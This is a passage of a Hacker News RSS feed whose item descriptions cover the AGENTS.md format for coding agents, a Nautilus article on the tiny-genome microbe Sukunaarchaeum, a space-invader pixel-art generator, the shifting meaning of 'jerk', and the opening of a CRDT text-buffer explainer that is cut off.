AGENTS.md file at the root of the repository. Most coding agents can even scaffold one for you if you ask nicely.</p></div><div><h3>2<!-- -->. <!-- -->Cover what matters</h3><div><p>Add sections that help an agent work effectively with your project. Popular choices:</p><ul><li>Project overview</li><li>Build and test commands</li><li>Code style guidelines</li><li>Testing instructions</li><li>Security considerations</li></ul></div></div><div><h3>3<!-- -->. <!-- -->Add extra instructions</h3><p>Commit messages or pull request guidelines, security gotchas, large datasets, deployment steps: anything you’d tell a new teammate belongs here too.</p></div><div><h3>4<!-- -->. <!-- -->Large monorepo? Use nested AGENTS.md files for subprojects</h3><p>Place another AGENTS.md inside each package. Agents automatically read the nearest file in the directory tree, so the closest one takes precedence and every subproject can ship tailored instructions. For example, at time of writing the main OpenAI repo has 88 AGENTS.md files.</p></div></div></div><div><div><h2>About</h2><div><p>AGENTS.md emerged from collaborative efforts across the AI software development ecosystem, including<!-- --> <a href="https://openai.com/codex/" target="_blank" rel="noopener noreferrer">OpenAI Codex</a>,<!-- --> <a href="https://ampcode.com/" target="_blank" rel="noopener noreferrer">Amp</a>,<!-- --> <a href="https://jules.google/" target="_blank" rel="noopener noreferrer">Jules from Google</a>,<!-- --> <a href="https://cursor.com/" target="_blank" rel="noopener noreferrer">Cursor</a>, and<!-- --> <a href="https://factory.ai/" target="_blank" rel="noopener noreferrer">Factory</a>.</p><p>We’re committed to helping maintain and evolve this as an open format that benefits the entire developer community, regardless of which coding agent you use.</p></div></div><div id="faq"><h2>FAQ</h2><div><div><h3>Are there required fields?</h3><p>No. AGENTS.md is just standard Markdown. Use any headings you like; the agent simply parses the text you provide.</p></div><div><h3>What if instructions conflict?</h3><p>The closest AGENTS.md to the edited file wins; explicit user chat prompts override everything.</p></div><div><h3>Will the agent run testing commands found in AGENTS.md automatically?</h3><p>Yes—if you list them. The agent will attempt to execute relevant programmatic checks and fix failures before finishing the task.</p></div><div><h3>Can I update it later?</h3><p>Absolutely. Treat AGENTS.md as living documentation.</p></div><div><h3>How do I migrate existing docs to AGENTS.md?</h3><div><p>Rename existing files to AGENTS.md and create symbolic links for backward compatibility:</p><div><pre><code><p>mv AGENT.md AGENTS.md &amp;&amp; ln -s AGENTS.md AGENT.md</p></code></pre></div></div></div></div></div></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tiny microbe challenges the definition of cellular life (128 pts)]]></title>
            <link>https://nautil.us/a-rogue-new-life-form-1232095/</link>
            <guid>44957157</guid>
            <pubDate>Tue, 19 Aug 2025 23:18:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nautil.us/a-rogue-new-life-form-1232095/">https://nautil.us/a-rogue-new-life-form-1232095/</a>, See on <a href="https://news.ycombinator.com/item?id=44957157">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                        
            <p><span>S</span>cientists recently discovered a microbe with one of the tiniest genomes on Earth. More surprising, the creature is almost entirely dependent on its host: Its genes don’t support any of the functions of metabolism, one of the key processes of life. As such, it challenges fundamental notions of what it means to be a living organism.</p>
      
    <p>The discovery was “pure serendipity,” says Takuro Nakayama, an evolutionary microbiologist at the University of Tsukuba in Japan. Takayama wanted to study the many microbes that live within a single-celled marine dinoflagellate, <em>Citharistes regius</em>, a kind of plankton. But when he and his colleagues sequenced the genes of this microbial community, they kept turning up tiny, odd chunks of DNA.</p><p>It turns out that these DNA chunks belong to some unusual archaea—a branch on the tree of life populated by single-celled microbes that can often survive in extreme environments. (Archaea are similar to bacteria, but distinct in their structure, genetics, and metabolism.)</p><blockquote><p>How did Sukunaarchaeum end up with such a strikingly tiny genome?</p></blockquote>
          <div>
            <p>ADVERTISEMENT</p>
            
            
      <p>
        Nautilus Members enjoy an ad-free experience.
        <a href="https://nautil.us/concierge-login" data-ev-act="login" data-ev-cat="article-ad" data-ev-label="in body ad">
          Log in
        </a>
        or
        <a href="https://nautil.us/join" data-ev-act="subscribe" data-ev-cat="article-ad" data-ev-label="in body ad">
          Join now
        </a>.
      </p>
          </div><p>Nakayama and his colleagues proposed the name Sukunaarchaeum mirabile for the newly-discovered microbe: Sukunaarchaeum after the Japanese dwarf deity <em>Sukuna-biko-na</em>, and mirabile for marvelous. At only 238,000 base pairs, the number of genes in the DNA of Sukunaarchaeum is smaller than that of any other known archaea. The scientists described <a href="https://www.biorxiv.org/content/10.1101/2025.05.02.651781v1" target="_blank" rel="noreferrer noopener">their finding</a> in a bioRxiv preprint earlier this year.</p><p>So how did Sukunaarchaeum end up with such a strikingly tiny genome? Over the course of evolution, genetic instructions for life often become increasingly complex. But evolution can also go in the other direction, leading to greater simplicity in the genome. This so-called genomic reduction, where organisms end up with fewer genes than their ancestors, is typically observed in the domains of bacteria and archaea. What struck Nakayama and his colleagues about Sukunaarchaeum was the extent of reduction and specialization in its genes.</p><p>With its stripped down genome, Sukunaarchaeum appears to be completely dependent on its host, <em>C. regius</em>, for essential energy and nutrients. “It likely cannot produce its own cellular building blocks,” notes Nakayama. “No previously discovered microbe has shown such an extreme degree of metabolic dependence.” </p><p>Sukunaarchaeum seems to almost inhabit a new category of life, suspended somewhere between archaea and virus. It is like viruses—which aren’t typically considered to be “alive”—in that it has a tiny genome and is totally dependent on its host for metabolism. But unlike a virus, Sukunaarchaeum has its own ribosomes, cellular structures that synthesize proteins, and it can replicate itself without the help of a host.</p>
          <div>
            <p>ADVERTISEMENT</p>
            
            
      <p>
        Nautilus Members enjoy an ad-free experience.
        <a href="https://nautil.us/concierge-login" data-ev-act="login" data-ev-cat="article-ad" data-ev-label="in body ad">
          Log in
        </a>
        or
        <a href="https://nautil.us/join" data-ev-act="subscribe" data-ev-cat="article-ad" data-ev-label="in body ad">
          Join now
        </a>.
      </p>
          </div><p>To get a sense of just how unusual Sukunaarchaeum is, the researchers decided to scan the oceans for potential relatives. They analyzed environmental genetic sequence data from marine environments all over the world, focusing on spots where <em>C. regius</em> is known to live. Using a database called the Tara Oceans project, they discovered a vast array of sequences that are comparable to that of Sukunaarchaeum, which they hypothesize could represent a new, deeply branching archaeal lineage.</p><p>For Nakayama, this additional finding suggests that many more microbes that challenge the definition of life may be out there, living in what Nakayama calls “microbial dark matter,” or microbes that can’t be cultivated in the lab. “The extreme, virus-like lifestyle we hypothesize for Sukunaarchaeum is a perfect example of the surprising outcomes found in this ‘natural laboratory of evolution,’” he says.</p><p>Mart Krupovic, a virologist and microbiologist at Institut Pasteur in France who wasn’t involved in the study, called the finding “remarkable.” Krupovic has studied giant viruses that, like Sukunaarchaeum, <a href="https://doi.org/10.4161/cib.18624" target="_blank" rel="noreferrer noopener">defy categorization</a>. These giant viruses have evolved larger and more complex genomes that include some of the genes for DNA translation, a characteristic thought to be reserved for cellular life. “I think that is fascinating,” says Krupovic, “how little we still know about the world which surrounds us.”</p><p>Next, Nakayama wants to culture and isolate Sukunaarchaeum in the lab, not just its genes, and take an image or video of it. He hopes this will help him better understand its biology, ecology, and how it is built—how it achieves this curious feat of living on the edge of life. <img decoding="async" src="https://assets.nautil.us/sites/3/nautilus/nautilus-favicon-14.png?fm=png" alt=""></p>
          <div>
            <p>ADVERTISEMENT</p>
            
            
      <p>
        Nautilus Members enjoy an ad-free experience.
        <a href="https://nautil.us/concierge-login" data-ev-act="login" data-ev-cat="article-ad" data-ev-label="in body ad">
          Log in
        </a>
        or
        <a href="https://nautil.us/join" data-ev-act="subscribe" data-ev-cat="article-ad" data-ev-label="in body ad">
          Join now
        </a>.
      </p>
          </div><p><em>Lead image: Elizabeth Ann Stevens / Shutterstock</em></p>              
                            <ul>
                                      <li>
                      <div>
                        <h6>
                          Alice Sun                        </h6>
                        <p>
                          Posted on <time datetime="2025-08-19T15:50:09-05:00">August 19, 2025</time>
                        </p>
                      </div>
                                                <p>
                            Alice Sun is a science journalist based in Brooklyn, N.Y. Her work frequently covers biology, the environment, social science, mental health, and more. More of her work can be found on <a href="https://www.alicesun.ca/">her website</a> and <a>X</a> (formerly known as Twitter).                          </p>
                                            </li>
                                  </ul>
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to Draw a Space Invader (436 pts)]]></title>
            <link>https://muffinman.io/blog/invaders/</link>
            <guid>44956915</guid>
            <pubDate>Tue, 19 Aug 2025 22:41:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://muffinman.io/blog/invaders/">https://muffinman.io/blog/invaders/</a>, See on <a href="https://news.ycombinator.com/item?id=44956915">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article>

<p>I recently made the <a href="https://muffinman.io/invaders/">Space Invader Generator</a> for Creative Coding Amsterdam <a href="https://cca.codes/invaders">code challenge</a>. I made it for fun of course... and galactic domination too! You can see how it looks below and in this post I'll show you how it works using an interactive animation.</p>
<a href="https://muffinman.io/invaders/"><figure><img src="https://muffinman.io/blog/invaders/ui.png" alt="" width="2490" height="1696"></figure></a>
<p>Here are a few invaders it can generate:</p>

<p>While showing friends how it works, I realized the process would look great animated. So I decided to write another interactive blog post. I'll give you some background first, but if you are eager to see the process, feel free to jump straight to the <a href="#building-the-invader">interactive part</a>.</p>
<h2 id="how-it-started">How it started <a href="#how-it-started">#</a></h2>
<p>I was working on a new version of <a href="https://muffinman.io/blog/sneak-peek-of-rayven/">Rayven</a>, my vector 3D renderer. Sometimes I get stuck working on tools - they turn into never-ending projects and I never actually use them to create something. At some point I became aware of this pattern, and I think I've gotten better at wrapping projects up, releasing them in one form or another, and moving on.</p>
<p>So I thought it would be cool to do a few plots using Rayven instead of endlessly tweaking the renderer itself. I wanted something simple that I could whip up quickly. It would be a meaningful milestone, even if I didn't finish everything I planned for Rayven.</p>
<p>Then I thought of Space Invaders. They are small, easy to render with 3D blocks, and instantly recognizable as part of video game history.</p>

<p>I did a few renders of the classic space invader and started thinking that it would be fun to generate random ones and create a series of plots. That sounded like a good idea to share as a code challenge.</p>
<h2 id="the-code-challenge">The code challenge <a href="#the-code-challenge">#</a></h2>
<p>I was pleasantly surprised that people liked the idea. We drafted some rules and the <a href="https://cca.codes/invaders">Space Invaders code challenge</a> was on! At the time of writing, the challenge is still ongoing, but once it wraps up, I'll link to all the submissions. I've already seen some works in progress and there is some really cool stuff coming - stay tuned!</p>
<h2 id="from-doodles-to-pixels">From doodles to pixels <a href="#from-doodles-to-pixels">#</a></h2>
<p>I often bore people by saying you should step back and solve the problem before diving into code. This time it was no different. I literally had no idea how to generate space invaders, so I started with some research. I doodled on paper, but pixel art felt like it deserved digital tools.</p>
<p>So I fired up Aseprite and got to work:</p>
<figure><img src="https://muffinman.io/blog/invaders/invaders.png" alt="" width="1050" height="1200"></figure>
<p>These are the 38 invaders I drew. They all fit in a 15x15 pixel grid, a bit larger than the originals, but I really liked how they turned out. I enjoyed drawing them a lot. Still, I had no clue how to generate them. I had some over-engineered ideas, but with such a small canvas I worried they would end up as unrecognizable splats of pixels.</p>
<p>Looking at the drawings, a pattern started to emerge. And it was the best kind of pattern - one based on geometry and vector graphics, both things I enjoy and am good at. I chose to play to my strengths and try generating a vector invader. I'm glad to say it worked - what I implemented can generate most of the invaders I drew by hand.</p>
<p>Before we dive into the process, a small disclaimer: I won't go into every little detail, but I'll walk you through the core steps and make digressions about stuff I find interesting. If you want to see implementation details, you can check out the code on <a href="https://github.com/Stanko/invaders">GitHub</a>.</p>
<p>One last note: I use the terms 'generate' and 'randomly select' a lot. Usually that means I use randomness (with some constraints) to calculate a point in 2D space.</p>
<div><h2 id="building-the-invader">Building the invader <a href="#building-the-invader">#</a></h2><p>Here's our grid. It will stay in the viewport and we'll draw an invader on it as we scroll down.</p><p>We should probably start with the body. If you look at my sketches above, you might notice the same pattern I did - almost all of the bodies resemble a low-resolution polygon. The plan is to generate a vector polygon. The low resolution of the grid will help hide our (vector) crimes.</p><h3 id="finding-the-center">Finding the center <a href="#finding-the-center">#</a></h3><p>Having a central point for the body will help us draw the rest of it. Think of it as an anchor. Since we'll generate tentacles in the bottom part, it makes sense to shift the body slightly upward.</p><p>The original space invaders are symmetrical around the vertical axis, and we can use that to our advantage. It's enough to generate one side of the body and then mirror it.</p><h3 id="defining-top-and-bottom">Defining top and bottom <a href="#defining-top-and-bottom">#</a></h3><p>To generate one side of the body, we start with top and bottom points. Both sit on the vertical axis of symmetry and are randomly selected.</p><h3 id="drawing-the-left-side">Drawing the left side <a href="#drawing-the-left-side">#</a></h3><p>We only need to generate one side and then mirror it. On the left side, we'll randomly pick between one and five points.</p><p>At first I limited it to two or three points with a convex shape. Later I allowed more points and dropped the convex rule, which unlocked more interesting results. Lines sometimes overlap, but once pixelized, those imperfections disappear.</p><h3 id="mirroring-it-to-the-right">Mirroring it to the right <a href="#mirroring-it-to-the-right">#</a></h3><p>Once the left side vertices are generated, we mirror them to the right.</p><h3 id="connect-the-dots">Connect the dots <a href="#connect-the-dots">#</a></h3><p>Now we connect the points into a polygon. Side points are connected according to their vertical position.</p><p>That gives our invader a body! Now let's add some extremities.</p><h2 id="adding-limbs">Adding limbs <a href="#adding-limbs">#</a></h2><p>In code, limbs generated on the bottom side are called tentacles, and the ones on the top are horns. They are generated the same way, just with different parameters.</p><p>Let's see how to generate one tentacle, and then we'll reuse the same technique for others.</p><h3 id="finding-the-root">Finding the root <a href="#finding-the-root">#</a></h3><p>Since tentacles grow from the bottom, we start with the lowest side point of the body polygon. As usual, we do the left side first and mirror later.</p><h3 id="sketching-the-mid-line">Sketching the mid-line <a href="#sketching-the-mid-line">#</a></h3><p>From the lowest point, we generate a few random points to form a polyline. Its length is random, and it serves as a mid-line for the tentacle.</p><h3 id="fattening-the-line">Fattening the line <a href="#fattening-the-line">#</a></h3><p>On its own, the line is too thin. To turn it into a tentacle we need to give it width. The trick is to calculate points on both sides of the bisector line and connect them together. I like this technique and use it often for my drawings.</p><p>It feels natural that the tentacle is wider where it connects to the body and shrinks further away. To achieve this, we reduce the bisector length as we move outward.</p><p>Two notes on this "fat line" algorithm:</p><ul>
<li>Because the mid-line is random, we often get sharp corners, which create weird overlaps. To soften them we scale down the line width relative to how sharp the angle is.</li>
<li>In the generator, you'll see an easing parameter for the width. Probably overkill, but it lets me fine tune the width along the tentacle and occasionally fill a missing pixel. I liked the control, so I kept it.</li>
</ul><h3 id="our-first-tentacle">Our first tentacle <a href="#our-first-tentacle">#</a></h3><p>Connecting the bisector endpoints gives us our first fat line, or rather, our first tentacle.</p><p>Now we're ready to generate more tentacles and horns the same way.</p><h3 id="growing-more-tentacles">Growing more tentacles <a href="#growing-more-tentacles">#</a></h3><p>First we mirror the tentacle we just drew. Some invaders also have a middle tentacle. Let's <span tabindex="0" role="button">randomly decide</span><span><span><span>If the invader you are looking at hasn't grown a middle tentacle, refresh the page to get a new one.</span></span></span> if we should draw one.</p><p>For the middle tentacle we start from the bottom point of the body polygon. We draw a line just like before, but with one change - if we get close to a side tentacle we stop. This avoids overlaps that often create a blob of pixels.</p><p>To keep the middle tentacle symmetrical, we'll take the lazy route - draw it randomly and then mirror it.</p><h3 id="adding-horns">Adding horns <a href="#adding-horns">#</a></h3><p>We draw horns the same way, except we start from the central point and shoot diagonally upward. Horns use a slightly narrower angle range to avoid overlaps. As usual, draw the left one and then mirror it.</p><p>At this stage we have a very <del>crappy</del> rough vector invader. With this rough outline in place, the next challenge is turning it into the pixelated look we all know and love.</p><h2 id="turning-vectors-into-pixels">Turning vectors into pixels <a href="#turning-vectors-into-pixels">#</a></h2><p>By pixelization, I mean painting pixels on the grid based on the vector invader. My first idea was to calculate how much of each pixel lies inside the vector shape and paint it if it's over 50%. That would be the most accurate, but it felt over-engineered for such a tiny grid.</p><h3 id="pixelizing-the-body">Pixelizing the body <a href="#pixelizing-the-body">#</a></h3><p>Instead, we'll keep it simple - check if the center of a pixel is inside the polygon. If it is, paint it.</p><p>This method isn't perfectly accurate, but it's easy and more than good enough. We're drawing tiny fictional space invaders, not building a universal rasterizer.</p><h3 id="pixelizing-the-limbs">Pixelizing the limbs <a href="#pixelizing-the-limbs">#</a></h3><p>Tentacles can get thin, so often the center of a pixel won't fall inside them. That leaves only a few pixels painted. To improve this, we check if the center of a pixel is close to one of the tentacle points. If so, we paint it.</p><p>But if the points are far apart, that still leaves gaps. To improve it, I added a <code>line splitting</code> parameter that subdivides the mid-line into more segments. More points mean a higher chance that a pixel center will be near one. It is not essential, but it helps fine tune invaders you like.</p><p>Now it really looks like an invader - but it's still blind. Let's slap some eyes on it!</p><h2 id="adding-eyes">Adding eyes <a href="#adding-eyes">#</a></h2><p>We could get clever with eyes, but a few predefined sets work just fine. I already drew some, so we just select one set. We'll place the eyes near the central point, since the body is built around it.</p><p>To keep eyes from ending up on the edge, I padded the predefined sets with a few extra pixels. To <span tabindex="0" role="button">make it easier to see</span><span><span><span>Pun intended!</span></span></span>, these extra pixels are shown lighter in the animation. Finally, if eye pixels overlap with body pixels, we remove them to create holes.</p><h2 id="coloring-the-invader">Coloring the invader <a href="#coloring-the-invader">#</a></h2><p>Finally, we can apply some color and there is our invader! Let's talk about color a little.</p><p>To generate colors, I used the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/color_value/oklch">OKLCH color space</a>. It's similar to HSL, but unlike HSL it has predictable lightness. That means if we keep the lightness parameter fixed and randomly generate the other two, all generated colors share the same lightness. This is practical for many reasons, but in our case it helps us create colors of similar vibrancy for each invader.</p><p>The code looks like this:</p><pre><code><span><span>const</span> l <span>=</span> <span>random</span><span>(</span><span>0.55</span><span>,</span> <span>0.8</span><span>,</span> rng<span>,</span> <span>2</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
</span><span><span>const</span> c <span>=</span> <span>random</span><span>(</span><span>0.2</span><span>,</span> <span>0.5</span><span>,</span> rng<span>,</span> <span>2</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
</span><span><span>const</span> h <span>=</span> <span>(</span><span>random</span><span>(</span><span>120</span><span>,</span> <span>420</span><span>,</span> rng<span>,</span> <span>0</span><span>)</span> <span>%</span> <span>360</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span> <span>// skip brownish tones 60 - 120</span>
</span><span>
</span><span><span>document</span><span>.</span><span>documentElement</span><span>.</span><span>style</span><span>.</span><span>setProperty</span><span>(</span><span>'--theme-l'</span><span>,</span> l<span>)</span><span>;</span>
</span><span><span>document</span><span>.</span><span>documentElement</span><span>.</span><span>style</span><span>.</span><span>setProperty</span><span>(</span><span>'--theme-c'</span><span>,</span> c<span>)</span><span>;</span>
</span><span><span>document</span><span>.</span><span>documentElement</span><span>.</span><span>style</span><span>.</span><span>setProperty</span><span>(</span><span>'--theme-h'</span><span>,</span> h<span>)</span><span>;</span>
</span></code></pre><p>Notice that for the hue I skip the range between 60 and 120 - yellow-brownish tones I didn't like.</p><h3 id="color-tweaks-with-css">Color tweaks with CSS <a href="#color-tweaks-with-css">#</a></h3><p>One cool thing is that we can keep <code>l</code>, <code>c</code> and <code>h</code> as separate CSS variables. That makes it easy to mix and match or manipulate them with CSS <code>calc</code> method.</p><p>For example, I use this to fix lightness for controls in the generator so they always have enough contrast:</p><pre><code><span><span><span>.controls</span></span> <span>{</span>
</span><span>  <span>--controls-main</span><span>:</span> <span>oklch</span><span>(</span><span>0.6</span> <span>var</span><span>(</span><span>--theme-c</span><span>)</span> <span>var</span><span>(</span><span>--theme-h</span><span>)</span><span>)</span><span>;</span>
</span><span>  <span>--controls-main-light</span><span>:</span> <span>oklch</span><span>(</span><span>0.75</span> <span>var</span><span>(</span><span>--theme-c</span><span>)</span> <span>var</span><span>(</span><span>--theme-h</span><span>)</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre><p>I also use it in debug mode to make tentacle and horn pixels darker and less saturated:</p><pre><code><span><span><span>.invader--debug</span> <span>.invader-pixel--l</span></span> <span>{</span>
</span><span>  <span>fill</span><span>:</span> <span>oklch</span><span>(</span><span>calc</span><span>(</span><span>var</span><span>(</span><span>--theme-l</span><span>)</span> <span>*</span> <span>0.8</span><span>)</span> <span>calc</span><span>(</span><span>var</span><span>(</span><span>--theme-c</span><span>)</span> <span>*</span> <span>0.6</span><span>)</span> <span>var</span><span>(</span><span>--theme-h</span><span>)</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre></div>
<h2 id="bringing-it-to-life">Bringing it to life <a href="#bringing-it-to-life">#</a></h2>
<p>For the animation, we'll try to mimic the original video game. The original invaders have very simple two-frame animations with tentacles and horns moving.</p>
<p>To move tentacles and horns, we clone their mid-lines and randomly shift a few end points. This gives us a variation for each tentacle and horn. Then we redraw the fat lines around them, pixelize it again, and get the second frame. To top it off and add a bit more life, we also move the eyes by one pixel.</p>
<p>Here is how it looks in action:</p>

<p>The pink lines are alternate mid-lines for tentacles and horns. In the generator, you can see this debug view by turning on both <code>animate</code> and <code>debug</code> options.</p>
<h2 id="size">Size <a href="#size">#</a></h2>
<p>I love how increasing the grid size makes the invader feel like it’s evolving or growing. The same algorithm runs, but on a larger area, which allows for more details.</p>

<p>But if we increase the size too much, the vector shape becomes more prominent and it usually doesn't look good. Occasionally you'll get something that looks like a final boss, but most of the time you end up with ridiculous crappy ones:</p>

<p>That's why I capped the size in the generator's interface to 31x31 pixels. But there is a way to increase it a bit more. If you change the URL directly you can push it up to a maximum of <a href="https://muffinman.io/invaders/#/size:25/">51x51 pixels</a>. I left this hidden feature in to show how increasing the size breaks the illusion.</p>
<h2 id="conclusion">Conclusion <a href="#conclusion">#</a></h2>
<p>We made it!</p>
<p>Thank you for sticking with me until the end. We built a generator that can create an infinite number of little colorful invaders. I'm super happy with how they turned out, and I hope you like them too.</p>
<p>Making the generator and writing the post was a lot of fun. There are still things to add and improve, but like I said earlier - I learned how to publish a project even when my TODO list isn't empty. I might add a few more things to the generator, but I've got other projects lined up, so we'll see.</p>
<p>I honestly hope you enjoyed reading the post and generating our little colorful intergalactic friends. And don't forget to <a href="https://muffinman.io/invaders/">generate your own fleet</a>.</p>
<h2 id="making-of-the-post">Making of the post <a href="#making-of-the-post">#</a></h2>
<p>I usually keep all of the JavaScript in my posts unminified so people can read the code and hack around. But in this case, the invader generator and the animation use several external dependencies, so it was easier to add a build step.</p>
<p>The animation is made with <a href="https://animejs.com/">Anime.js</a> and its code lives in the <a href="https://github.com/Stanko/invaders/blob/dev/src/drawing/step-by-step.ts">generator repository</a>. The TypeScript gets compiled and copied to my blog repo. Finally, there is a <a href="https://github.com/Stanko/Stanko.github.io/blob/brz/site/public/js/posts/invaders/index.js">small script</a> that coordinates the animation and connects it to the page scroll.</p>
<p>The animation is also available in the generator itself. If you add the <code>step</code> parameter and toggle debug mode you'll be able to <a href="https://muffinman.io/invaders/?step#/debug:true">play with it</a> there as well.</p>
<h2 id="bonus---the-rope-post">Bonus - The rope post <a href="#bonus---the-rope-post">#</a></h2>
<p>If you liked this post, check out my earlier interactive one - <a href="https://muffinman.io/blog/draw-svg-rope-using-javascript/">Draw SVG rope using JavaScript</a>. I think you'll enjoy it.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The forgotten meaning of "jerk" (107 pts)]]></title>
            <link>https://languagehat.com/the-forgotten-meaning-of-jerk/</link>
            <guid>44956730</guid>
            <pubDate>Tue, 19 Aug 2025 22:11:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://languagehat.com/the-forgotten-meaning-of-jerk/">https://languagehat.com/the-forgotten-meaning-of-jerk/</a>, See on <a href="https://news.ycombinator.com/item?id=44956730">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Ben Lindbergh at the Ringer <a href="https://www.theringer.com/movies/2023/8/8/23824204/jerk-word-evolution-steve-martin-goodfellas-jerry-maguire">asks</a> “When did jerk stop meaning ‘stupid’?”  He starts with the Steve Martin movie <em>The Jerk</em>, saying of its protagonist:</p>
<blockquote><p>Navin is oblivious, not obnoxious. He’s ignorant, not intolerant. He’s naive, not intentionally cruel. He’s a bumpkin, a rube, and a moron, maybe, but a jerk? For the most part, no, I wouldn’t say so.</p></blockquote>
<p>There he is, of course, using the current sense of <em>jerk</em>:</p>
<blockquote><p>“There’s definitely been a semantic shift in ‘jerk’ over the years,” says linguist, lexicographer, and <em>Wall Street Journal</em> language columnist Ben Zimmer. The <em>Oxford English Dictionary</em>, which dates “jerk,” an American colloquialism, back to 1935, reports: “Originally: an inept or pathetic person; a fool. Now: an objectionable or obnoxious person.” <em>Green’s Dictionary of Slang</em>, which traces “jerk” back to 1934, <a href="https://greensdictofslang.com/entry/3d633oy">defines</a> its original meaning as “a fool, an idiot, a failure.”</p></blockquote>
<p>He goes into the change in some detail, and it makes fascinating reading, but here’s the part that grabbed my attention and made me post it:<br>
<span id="more-13463"></span></p>
<blockquote><p>Here’s the sort of spooky thing. It’s not just that there are multiple generations who’ve never known a “jerk” was once a simpleton or sap. It’s that some of the folks who used to use it that way don’t remember that they did. When I asked my mom to define the word this week, she used the modern meaning, with no apparent recollection of her former firm conviction that a jerk was a dope, dodo, or dimwit. Did someone Neuralyze my mom, or have I become a jerk truther?</p>
<p>My mom isn’t the only boomer who may have revised their history of this specific subject. You can trace the ascendance of the asshole strain of jerk through the writing of Pulitzer Prize–winning columnist and humorist Dave Barry, who’s between my mom and Martin in age. In <em>Stay Fit and Healthy Until You’re Dead</em> (1985), Barry wrote, “How many bones do you think your skeletal system has? Would you say 50? 150? 250? 300? More than 300? If you guessed 50, you’re a real jerk.” In <em>Dave Barry Turns 40</em> (1990), he wrote, “So your financial situation is a mess. Okay, fine. The important thing is—don’t be discouraged. There’s no reason to get down on yourself, just because you’ve been an unbelievable jerk.” But by 1996—the year of “Show me the money”—he was using the modern meaning in a <a href="https://www.chicagotribune.com/news/ct-xpm-1996-10-13-9610130409-story.html">column</a> headlined, “What It Takes to Be a Jerk.”</p>
<p>When I brought this to Barry’s attention and asked him how the great redefinition of jerk may have happened, he wrote, “I always thought jerk meant asshole. At least I <em>thought</em> I always thought that, although the quotes you cite seem to suggest otherwise. So to answer your question: I have no idea. You may be right!” […]</p>
<p>A little light searching suggests I’m not the only amateur etymologist to lose their lexical bearings over the near-forgotten former meaning of “jerk.” “When did jerk stop meaning stupid?” a Redditor <a href="https://www.reddit.com/r/NoStupidQuestions/comments/letbs0/when_did_jerk_stop_meaning_stupid/">asked</a> in 2021 (ironically, on the NoStupidQuestions subreddit). Others have seemed similarly unnerved by how the word went from signifying one thing to signifying something else so suddenly, within living memory, as everyone who used to use it the old way overwrote the old definition. There’s a sense of suddenly standing on shaky ground: <em>Am I fluent in this language, or have I Englished wrong all along? How can we communicate if “jerk” meant nitwit in 1982 but not in 1996?</em></p></blockquote>
<p>Reader, I too am such a boomer.  When I started reading the column I thought <em>jerk</em> had always meant ‘asshole’ to me (even if it wasn’t quite as harsh), but as I went along I realized that no, I used to use it in the “dummy” sense but had somehow forgotten that fact.  On the one hand, I’m glad it’s not just me, but on the other… it’s weird and unsettling!</p>
<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://languagehat.com/the-forgotten-meaning-of-jerk/"
    dc:identifier="https://languagehat.com/the-forgotten-meaning-of-jerk/"
    dc:title="The Forgotten Meaning of “Jerk.”"
    trackback:ping="https://languagehat.com/the-forgotten-meaning-of-jerk/trackback/" />
</rdf:RDF>-->
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Perfect Freehand – Draw perfect pressure-sensitive freehand lines (138 pts)]]></title>
            <link>https://www.perfectfreehand.com/</link>
            <guid>44955624</guid>
            <pubDate>Tue, 19 Aug 2025 19:53:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.perfectfreehand.com/">https://www.perfectfreehand.com/</a>, See on <a href="https://news.ycombinator.com/item?id=44955624">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[CRDT: Text Buffer (142 pts)]]></title>
            <link>https://madebyevan.com/algos/crdt-text-buffer/</link>
            <guid>44955459</guid>
            <pubDate>Tue, 19 Aug 2025 19:38:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://madebyevan.com/algos/crdt-text-buffer/">https://madebyevan.com/algos/crdt-text-buffer/</a>, See on <a href="https://news.ycombinator.com/item?id=44955459">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <section>
        

  

  
  <p>
    Collaboratively editing strings of text is a common desire in peer-to-peer applications. For example, a note-taking
    app might represent each document as a single collaboratively-edited string of text.
  </p>
  <p>
    The algorithm presented here is one way to do this. It comes from a family of algorithms called
    <a href="https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type">CRDTs</a>, which I will not describe
    here. It's similar to the approaches taken by popular collaborative text editing libraries such as
    <a href="https://github.com/yjs/yjs">Yjs</a> and <a href="https://github.com/automerge/automerge">Automerge</a>.
    Other articles have already been written about these similar approaches (see the
    <a href="#references">references</a> section below), but this article also has a nice interactive visualization of
    what goes on under the hood.
  </p>
  <p>
    <b><i>The algorithm:</i></b>
  </p>
  <ul>
    <li>
      <p>
        Each character is assigned a unique identifier consisting of <code>site</code> (the identifier of the creator)
        and <code>clock</code> (a site-specific integer that is incremented after every operation) as well as a
        (possibly null) <code>parent</code> pointer to a previous character.
      </p>
    </li>
    <li>
      <p>
        To insert a character, set its <code>parent</code> pointer to the character immediately before the insertion
        point at the time of insertion (or to null when inserting at the beginning). The character order is determined
        by a pre-order tree traversal that places parents before their children. This is
        <a href="https://madebyevan.com/algos/crdt-tree-based-indexing/">tree-based indexing</a>.
      </p>
    </li>
    <li>
      <p>
        To order characters with the same parent, have each character also store a <code>counter</code> value and sort
        first by <code>counter</code> (use descending order), then by the <code>site</code> of the character (use
